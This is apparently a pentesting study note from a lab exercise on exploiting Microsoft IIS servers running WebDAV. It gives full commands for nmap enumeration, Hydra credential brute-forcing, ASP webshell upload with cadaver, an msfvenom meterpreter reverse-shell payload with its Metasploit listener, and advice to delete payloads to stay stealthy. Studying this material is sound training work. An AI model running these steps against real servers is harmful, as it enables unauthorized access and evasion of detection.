---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# Exploiting Microsoft IIS & WebDAV

## Microsoft IIS

- IIS = Internet Information Services
- It can be used to host websites and provides admins a GUI to manage them
- Can be used to host static or dynamic web pages developed in ASP.NET and PHP
- Typically configured to run on ports 80/443
- Supported file extensions:
	- .asp
	- .aspx
	- .config
	- .php

## WebDAV

- Set of extensions to the HTTP protocol with allow users to collaboratively edit and manage files on remote web servers.
- Enables a web server to function as a file server for collaborative authoring
- Runs on top of Microsoft IIS on ports 80/443
- Implements username and password authentication 

## Exploitation

- Identify whether WebDAV has been configured to run on the IIS web server
- Perform brute-force attack on the server to identify legitimate credentials
- Authenticate to the server and upload a malicious .asp payload to execute arbitrary commands or obtain a reverse shell on the target

## Tools

- [[davtest]]
	- used to scan, authenticate and exploit a WebDAV server
- [[cadaver]]
	- used to authenticate to a WebDAV server and upload/download file and other functionalities

## Demonstration

First step: nmap scan

```bash
nmap -sV -sC <ip>
```

```bash
nmap -sV -p 80 --script http-enum <ip>
```

Navigating to `<ip>/webdav/` ask for credentials.

[[Hydra]] will be used to brute force the server:

```bash
hydra -L common_users.txt -P common_passwords.txt <ip> http-get /webdav/
```

Find the wordlists here: `/usr/share/wordlists/metasploit/common_users.txt`

 2 files on the server:

 - AttackDefense.txt
 - web.config

Test for authentication:

```bash
davtest -url http://<ip>/webdav
```

```bash
davtest -auth <user>:<pass> -url http://<ip>/webdav
```

- Test for file upload
- Test for file execution

We can now use `cadaver` to upload a .asp payload.

Find webshells here: `/usr/share/webshells/*`

```bash
cadaver http://<ip>/webdav
Username:
Password:
dav:/webdav/> ls
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

Then visit the `<ip>/webdav/webshell.asp` to start interacting with the target.

## Exploiting with Metasploit

Same technique with [[Metasploit]]

```bash
nmap -sV -p 80 --script http-enum <ip>
```

Generate a payload with [[msfvenom]]

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=1234 -f asp > shell.asp
```

Connect to the server using [[cadaver]]:

```bash
cadaver http://<ip>/webdav
Username:
Password:
dav:/webdav/> put shell.asp
```

On the website the shell is not present. Before executing the shell we need to setup a listener:

```bash
$ service postgresql start
$ msfconsole
msf6> use multi/handler/
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set LHOST <my_ip>
msf6> set LPORT 1234
msf6> run
```

Now we can execute the shell. Once the session is opened:

```bash
> sysinfo
> getuid
```

Same upload process but without `cadaver`:

```bash
> use exploit/windows/iis/iis_webdav_upload_asp
> set PATH /webdav/shell.asp
```

It is always helpful to be able to do things manually, without the help of Metasploit.

Always delete any payload/exploit uploaded on a server to stay as stealthy as possible.
